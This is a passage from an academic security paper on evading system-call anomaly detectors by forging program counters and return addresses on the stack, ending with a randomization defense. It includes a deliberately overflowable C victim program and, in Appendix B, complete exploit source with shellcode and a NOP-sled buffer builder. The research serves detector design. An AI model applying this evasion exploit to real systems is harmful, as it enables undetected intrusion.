to modify the stack frame, so that the detector does
not observe an anomaly, even for system calls made
by the attack code. (Please refer to Appendix A for
a brief review on the structure of a stack frame.)
We demonstrate our attack using a very simple vic-
tim program; see Figure 4. We emphasize that we
have implemented successful attacks for the pro-
gram in Figure 4 against (our own implementations
of) the anomaly detection techniques of [3, 16], as
well as against an independent implementation of
return address monitoring by the authors of that
technique [3]. The victim program takes a com-
mand line argument and passes it to f1(). f1()
calls another function f2() twice, which calls a li-
brary function lib(). The function lib() in the
victim program makes a system call, with 17 as the
system call number. Function f2() is called twice
just to make the victim program have multiple sys-
tem calls. The victim program is designed in this
way to demonstrate how most software programs
make system calls. Note that f1() has a local buﬀer
that can be overﬂowed.
void lib() { syscall(17); }
void f2() { lib(); }
void f1(char* str) { char buffer[512];
f2(); f2();
strcpy(buffer,str); }
int main(int argc, char *argv[]) {
f1(argv[1]); }
Figure 4: C source code of victim program
4.1 Forging the program counter
Upon receiving a system call from the monitored
process, the program counter indicates the address
of the instruction initiating the system call. Since
most system call invocations are made from within
a library function in libc (lib() in our sample vic-
tim program in Figure 4), the value of the program
counter is often not useful, particularly for dynam-
ically linked libraries. Therefore, in the work that
introduced monitoring the program counter, Sekar
et al. [16] instead trace back each system call to the
most recent function invocation from the statically
linked code section, and use this location as the pro-
gram counter. By doing this, the program counter
value will be an address in the program that results
in the system call, rather than an address in the
library. We take a similar approach in our work.
Before the program is run, the anomaly detection
system examines the section header table of the bi-
nary executable to ﬁnd out address range of the code
(text) section.7 At runtime, it determines the pro-
gram counter by tracing the return addresses from
the innermost stack frame until a return address
falls within that address range.
In order to evade detection by such a monitor, an
attack should ensure that:
1. The address of the attack code does not appear
as a return address when the anomaly detector
is tracing the program counter.
2. The program counter found by the anomaly de-
tection system is a valid address for the system
call made.
Because of the ﬁrst requirement, our attack code
cannot call a library function to make system calls.
If the attack code uses a call instruction, the ad-
dress of the attack code will be pushed onto the
stack and the anomaly detection system will ob-
serve the anomaly. So, instead of using a call in-
struction, our attack code uses a ret instruction.
(A jump instruction could serve the same purpose.)
The diﬀerence between a call and a ret instruc-
tion is that the call instruction pushes the return
address onto the stack and then jumps to the target
location, whereas a ret instruction pops the return
address and then jumps to that location. If we can
make sure that the return address is the address of
the instruction in the library function that makes
the corresponding system call, we could use the ret
instruction in place of a call instruction. Figure 5a
shows the stack layout right before the ret instruc-
tion is executed. By forging this stack frame, the
address of an instruction in lib() will be used as
the return address when ret is executed.
In order to satisfy the second requirement, we must
forge another address on the stack, which the mon-
itor will determine to be the location where lib()
is called. Our attack code simply inserts a valid
address (i.e., one that the monitor will accept for
this system call) at the appropriate location as the
forged program counter. Figure 5b shows the stack
layout after the ﬁrst ret is executed, as seen by the
anomaly detection system.
As described previously,
the above suﬃces to
achieve only one system call of the attack: after it
has been completed, control will return to the code
indicated by the forged program counter. However,
most attacks need to make at least a few system
calls. Thus we have a third requirement.
3. Execution will return to attack code after an
attack system call ﬁnishes.
...
addr of instruction in lib()
ebp → old ebp
esp → ...
(a) Before ret is executed
...
argument of lib()
forged program counter
ebp → old ebp
esp → ...
addr of instruction in lib() (popped)
old ebp (popped)
...
argument of f1()
addr of last instruction in main()
old ebp
buffer
...
addr of strcpy() in f1()
ebp → old ebp
esp → ...
argument of lib() (popped)
forged program counter (popped)
old ebp (popped)
... (popped)
addr of instruction in lib() (popped)
old ebp (popped)
(b) After ret is executed
(c) After lib() returns
Figure 5: Stack layouts in program counter forgery (stack grows downwards)
The idea to achieve this is to modify a return ad-
dress remaining on the stack after the system call
ﬁnishes. However, a challenge is that the instruction
that does this modiﬁcation has to be an instruction
in the original program’s code, because at that time
execution has not returned to the attack code yet.
Generally speaking, any instruction that performs
assignment by pointer dereferencing could be used.
For example if a is deﬁned as long*, and b is deﬁned
as long, the instruction *a = b; could be used for
our purpose. We just need to modify the stack, in-
cluding the ebp value, so that a is the address of
the return address that we want to modify, and b
is the value of an address in the attack code. Such
assignment instructions are common in C programs.
In our victim program (Figure 4) there is no instruc-
tion that performs simple assignment by pointer
dereferencing like *a = b;. We implement our at-
tack in a diﬀerent way. In the victim program, the
call to strcpy() is used to overﬂow the buﬀer and
therefore overwrite the return address. We could
execute this instruction again when the ﬁrst system
call made by the attack code ﬁnishes. This overﬂows
the buﬀer and overwrites the return address again.
Execution will return to the attack code when f1()
returns.
Figure 5c shows the stack layout our attack has to
forge in order to satisfy all three requirements. Exe-
cution will return to strcpy() in f1() and by doing
that, the return address of f1() will be overwritten
again. This ensures that execution will go back to
the attack code after a system call is made. Since
execution always starts at the same location in the
attack code, we need to keep some state information.
This could be realized by a counter. Each time the
attack code is entered the counter is checked and in-
cremented, so that the attack code knows how many
system calls it has already made.
4.2 Forging return addresses
We have also successfully extended our attack to
anomaly detection systems that monitor the entire
set of return addresses on the stack. The attack
is conﬁrmed to be successful against an implemen-
tation of anomaly detection approach proposed by
Feng et al. [3].
To achieve this, we need to modify our attack only
slightly to forge the entire set of return addresses
on the process execution stack.
In the attack de-
scribed in Section 4.1, we forged one return address
so that the monitor will see a valid program counter
value. Here, the attack is simply required to forge
more stack frames, including that for main(). The
forgery is simpler in this case, however, as the stack
frames contain only the return address and the old
ebp value, without any arguments or local variables.
These stack frames are only checked by the anomaly
detection system, and they are not used in program
execution at all.
5 Using randomization to defend
against forgery attacks
In this section we propose a (white-box) randomiza-
tion technique to defend against the forgery attack
presented in Section 4. The attack of Section 4 re-
quires the attacker to have an in-depth understand-
ing of the internal details of the victim program, as
well as the automaton representing the normal be-
havior of the victim program; e.g., the attacker must
know the value of the program counter and return
addresses to forge. Thus, randomization techniques
could be used to render this type of attack more
diﬃcult.
Although there have been previous works on ad-
dress obfuscation, e.g., [1], our goal here is to hide
program counter and return address values and pre-
vent attackers from forging them, which is diﬀer-
ent from previous works. Kc et al. [7] introduce
the idea of randomizing the instruction set to stop
code-injection attacks. However, our randomization
technique does not require special processor support
as required in [7].
An initial attempt is to randomize a base address.
Two types of base addresses could be randomized:
the starting address of dynamically linked libraries
and the starting address of the code segment in the
executable. The former can be implemented by in-
serting a dummy shared library of random size. The
latter can be implemented by simple modiﬁcations
to the linker. Changes to these base addresses are
easy to implement. However, this randomization
relies on only a single secret.
A more sophisticated technique is to reorder func-
tions in the shared library and/or the executable.
This can be combined with the ﬁrst approach to in-
troduce a diﬀerent random oﬀset for each function,
although implementation becomes a bit more com-
plicated. Both above techniques rely on the avail-
ability of the object code.
header table is always available for relocatable ﬁles
(not true for executables) and the dynamic symbol
table is always available for shared libraries, binary
analysis becomes much easier.
We note, however, that even this defense is not fool-
proof:
if the attacker is able to view the memory
image of the running process, the randomized ad-
dresses could be observed. As such, the attacker’s
code running in the address space of the process
could scan the address space to discern the random-
ized addresses and then adjust the return addresses
it forges on the call stack accordingly. However, this
substantially complicates the attack, and possibly
increases the attack code size.
6 Conclusions and future work
In this paper we perform the ﬁrst systematic study
on a wide spectrum of anomaly detection techniques
using system calls. We show that previous proposed
solutions could be organized into a space of three
axes, and that such an organization reveals new
possibilities for system-call-based program tracking.
We demonstrate through systematic study and em-
pirical evaluation the beneﬁts and costs of enhanc-
ing each of the three axes and show that some of the
new approaches we explore oﬀer better properties
than previous approaches. Moreover, we demon-
strate novel mimicry attacks on a recent proposal
using return addresses for system-call-based pro-
gram tracking. Finally we describe how a simple
white-box randomization technique can make such
mimicry attacks more diﬃcult.
Although white-box approaches could be problem-
atic on x86 platform as discussed in Section 2, re-
ordering functions in the dynamically linked library
and/or the executable is not diﬃcult for the follow-
ing reasons. First, we do not need to make any
changes within a function block. Most other white-
box techniques (e.g., [5, 6, 10]) need to analyze in-
dividual instructions in function blocks and insert
additional instructions. Second, since the section
We have analyzed the program counter and return
addresses as the runtime information acquired by
the anomaly detector. Other runtime information
we have not considered is the system call arguments.
It remains future work to include system call ar-
guments in our systematic analysis. The pattern
extraction algorithm used to group related system
calls together as an atomic unit is another area that
requires further attention.
Acknowledgements
This work was partially supported by the U.S. De-
fense Advanced Research Projects Agency and the
U.S. National Science Foundation.
Notes
1Prior work [3] states only that “. . . the intruder could
possibly craft an overﬂow string that makes the call stack
look not corrupted while it really is, and thus evade detec-
tion. Using our method, the same attack would probably still
generate a virtual path anomaly because the call stack is al-
tered.” Our attack demonstrates that this trust in detection
is misplaced.
2m ranges from 1 to n because the number of atomic units
the anomaly detector remembers is less than n in the ﬁrst n
states of program execution.
3In [17], n is recommended to be 6, which corresponds to
n = 5 in our parlance.
4Prasad and Chiueh claim that this renders the problem
of distinguishing code from data undecidable [10].
5Our exhaustive search guarantees that the resulting
mimicry attack involves the minimum number of system calls
made in the case of wu-ftpd, Apache httpd and Apache httpd
with chroot patch. However due to the complexity of the
proftpd automaton, we could only guarantee minimum num-
ber of intervening system calls between any two attack system
calls.
6If the automaton is, in fact, deterministic, then optimiza-
tions are possible. In this analysis we do not explicitly con-
sider these optimizations, though the reader should view the
fourth column of Figure 1 as potentially pessimistic.
7Strictly speaking, this constitutes white-box processing,
though qualitatively this is distant from and far simpler than
the in-depth static analysis performed by previous white-box
approaches. Were we to insist on sticking literally to gray-box
techniques, however, we could extract the same information
at run time using less convenient methods.
References
[1] S. Bhatkar, D. DuVarney and R. Sekar. Ad-
dress obfuscation: an eﬃcient approach to com-
bat a broad range of memory error exploits. In
Proceeding of the 12th USENIX Security Sym-
posium, pages 105–120, August 2003.
[2] H. Feng, J. Giﬃn, Y. Huang, S. Jha, W. Lee
and B. Miller. Formalizing sensitivity in static
analysis for intrusion detection. In Proceedings
of the 2004 IEEE Symposium on Security and
Privacy, May 2004.
[3] H. Feng, O. Kolesnikov, P. Fogla, W. Lee and
W. Gong. Anomaly detection using call stack
information. In Proceedings of the 2003 IEEE
Symposium on Security and Privacy, pages 62–
75, May 2003.
[4] S. Forrest, S. Hofmeyr, A. Somayaji, and
T. Longstaﬀ. A sense of self for Unix processes.
In Proceedings of the 1996 IEEE Symposium
on Security and Privacy, pages 120–128, May
1996.
[5] J. Giﬃn, S. Jha and B. Miller. Detecting ma-
nipulated remote call streams. In Proceedings
of the 11th USENIX Security Symposium, Au-
gust 2002.
[6] J. Giﬃn, S. Jha and B. Miller. Eﬃcient context-
sensitive intrusion detection. In Proceeding of
Symposium on Network and Distributed System
Security, Febuary 2004.
[7] G. Kc, A. Keromytis and V. Prevelakis. Coun-
tering code-injection attacks with instruction-
set randomization. In Proceeding of the 10th
ACM Conference on Computer and Communi-
cation Security, pages 272–280, October 2003.
[8] V. Kiriansky, D. Bruening and S. Amarasinghe.
Secure execution via program shepherding. In
Proceeding of the 11th USENIX Security Sym-
posium, August 2002.
[9] X. Lu. A Linux executable editing library. Mas-
ter’s Thesis, Computer and Information Sci-
ence, National Unviersity of Singpaore. 1999.
[10] M. Prasad and T. Chiueh. A binary rewriting
defense against stack based buﬀer overﬂow at-
tacks. In USENIX Annual Technical Confer-
ence, General Track, June 2003.
[11] N. Provos. Improving host security with system
call policies. In Proceeding of the 12th USENIX
Security Symposium, August 2003.
[12] N. Provos, M. Friedl and P. Honeyman. Pre-
venting privilege escalation. In Proceeding of
the 12th USENIX Security Symposium, August
2003.
[13] I. Rigoutsos and A. Floratos. Combinatorial
pattern discovery in biological sequences: the
TEIRESIAS algorithm. In Proceedings of the
1998 Bioinformatics, vol. 14 no. 1, pages 55–
67, 1998.
[23] A. Wespi, M. Dacier and H. Debar. An
intrusion-detection system based on the Teire-
sias pattern-discovery algorithm. In Proceed-
ings of the 1999 European Institute for Com-
puter Anti-Virus Research Conference, 1999.
[14] T. Romer, G. Voelker, D. Lee, A. Wol-
man, W. Wong, H. Levy, B. Bershad and
B. Chen. Instrumentation and optimization of
Win32/Intel executables using etch. In Proceed-
ing of the USENIX Windows NT workshop,
August 1997.
[15] B. Schwarz, S. Debray and G. Andrews. Dis-
assembly of executable code revisited. In Pro-
ceeding of Working Conference on Reverse En-
gineering, pages 45–54, Oct 2002.
[16] R. Sekar, M. Bendre, D. Dhurjati and P. Bolli-
neni. A fast automaton-based method for de-
tecting anomalous program behaviors. In Pro-
ceedings of the 2001 IEEE Symposium on Se-
curity and Privacy, pages 144–155, May 2001.
[17] K. Tan and R. Maxion. “Why 6?”—Deﬁning
the operational limits of stide, an anomaly-
based intrusion detector. In Proceedings of the
2002 IEEE Symposium on Security and Pri-
vacy, pages 188-201, May 2002.
[18] K. Tan, J. McHugh and K. Killourhy. Hiding
intrusions:
from the abnormal to the normal
and beyond. In Proceedings of Information Hid-
ing: 5th International Workshop, pages 1–17,
January 2003.
[19] D. Wagner. Janus: an approach for conﬁne-
ment of untrusted applications. Technical Re-
port CSD-99-1056, Department of Computer
Science, University of California at Berkeley,
August 1999.
[20] D. Wagner and D. Dean. Intrusion detection
via static analysis. In Proceedings of the 2001
IEEE Symposium on Security and Privacy,
pages 156–168, May 2001.
[21] D. Wagner and P. Soto. Mimicry attacks on
host-based intrusion detection systems. In Pro-
ceedings of the 9th ACM Conference on Com-
puter and Communications Security, Novem-
ber 2002.
[22] R. Wahbe, S. Lucco, T. E. Anderson and
S. L. Graham. Eﬃcient software-based fault
isolation. In Proceeding of the Symposium on
Operating System Principles, 1993.
[24] A. Wespi, M. Dacier and H. Debar. Intrusion
detection using variable-length audit trail pat-
terns. In Proceedings of the 2000 Recent Ad-
vances in Intrusion Detection, pages 110–129,
October 2000.
A Review of stack frame format
The call stack of the system we are using in this pa-
per is divided up into contiguous pieces called stack
frames. Each frame is the data associated with a call
to one function. The frame contains the arguments
given to the function, the function’s local variables,
etc. When the program is started, the stack has
only one frame. Each time a function is called, a
new frame is made. Each time a function returns,
the frame for that function invocation is eliminated.
If a function is recursive, there can be many frames
for the same function. The frame for the function
in which execution is actually occurring is called the
innermost frame.
The layout of a stack frame is shown in Figure 6.
ebp always stores the address of the old ebp value
of the innermost frame. esp points to the current
bottom of the stack. When program calls a function,
a new stack frame is created by pushing the argu-
ments to the called function onto the stack. The
return address and old ebp value are then pushed.
Execution will switch to the called function and the
ebp and esp value will be updated. After that, space
for local variables are reserved by subtracting the
esp value. When a function returns, ebp is used to
locate the old ebp value and return address. The
old ebp value will be restored and execution returns
to the caller function.
function arguments
return address
old ebp
local variables
ebp →
esp →
Figure 6: Stack frame layout (stack grows down-
wards)
B Source code for attack in Section 4
#include 
#define DEFAULT_OFFSET
#define DEFAULT_BUFFER_SIZE
#define NOP
0
545
0x90
char attackcode[] =
"\x5d"
"\x68\x81\xf9\xff\xbf"
"\x68\x42\x86\x04\x08"
"\x83\xec\x7f"
"\x83\xec\x7f"
"\x83\xec\x7f"
"\x83\xec\x7f"
"\x83\xec\x7f"
"\x83\xec\x7f"
"\x68\xe5\x85\x04\x08"
"\x68\xd8\xf7\xff\xbf"
"\x89\xe5"
"\x68\x47\x85\x04\x08"
"\x55"
"\x89\xe5"
"\x68\xd3\x84\x04\x08"
"\x55"
"\x89\xe5"
"\xc9"
"\xc3";
%ebp
/* pop
/* push bffff987 (arg to f1)
/* push 8048642 (forge ret addr)
/* sub
$0x7f, %esp
*/
*/
*/
*/
/* push 80485e5 (after f2 in f1)
*/
/* push bffff7d8 (correct ebp of f1) */
*/
/* mov
*/
/* push 8048547 (end of f2)
*/
/* push %ebp
*/
/* mov
/* push 80484d3 (start of f3/lib)
*/
*/
/* push %ebp
*/
/* mov
*/
/* leave
/* ret
*/
%esp,%ebp
%esp,%ebp
%esp,%ebp
int main(int argc, char *argv[]) {
char *buff, *ptr;
long *addr_ptr, addr;
int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
int i;
if (!(buff = malloc(bsize))) {
printf("Can’t allocate memory.\n");
exit(0);
}
addr = 0xbffff5d0;
printf("Using address: 0x%x\n", addr);
ptr = buff;
addr_ptr = (long *) ptr;
/* return address */
for (i = 0; i < bsize; i+=4)
*(addr_ptr++) = addr;
/* no-op */
for (i = 0; i < bsize/2; i++)
buff[i] = NOP;
/* attack code */
ptr = buff + ((bsize/2) - (strlen(attackcode)/2));
for (i = 0; i < strlen(attackcode); i++)
*(ptr++) = attackcode[i];
/* restore ebp */
ptr = buff + bsize - 9;
addr_ptr = (long *)ptr;
*(addr_ptr) = 0xbffff7f8;
/* end of string */
buff[bsize - 1] = ’\0’;
execl("./victim", "victim", buff, 0);
}